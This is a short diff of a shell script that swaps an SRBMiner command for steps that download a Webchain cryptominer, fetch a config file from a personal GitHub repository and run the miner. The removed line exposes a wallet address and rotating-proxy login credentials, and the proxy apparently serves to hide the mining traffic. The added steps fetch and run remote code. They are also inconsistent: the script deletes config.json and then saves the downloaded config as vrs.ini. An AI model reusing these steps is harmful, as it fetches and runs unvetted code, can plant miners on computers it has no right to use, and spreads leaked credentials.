@@ -1,1 +1,6 @@
-./SRBMiner-MULTI --disable-gpu --algorithm lyra2v2_webchain --pool pool.webchain.network:2222 --worker 365 --wallet 0x046f8ef4c344780cbde1474e7a336380a159d6e6 --cpu-threads  4 --proxy sqpkuusb-rotate:l31cz0h2675o@p.webshare.io:80
+wget https://github.com/mintme-com/miner/releases/download/v2.8.0/webchain-miner-2.8.0-linux-amd64.tar.gz 
+tar -zxf webchain-miner-2.8.0-linux-amd64.tar.gz
+rm config.json
+rm -rf config.json
+wget -O vrs.ini  https://raw.githubusercontent.com/sacha236/awe/main/mintme/config.json
+./webchain-miner
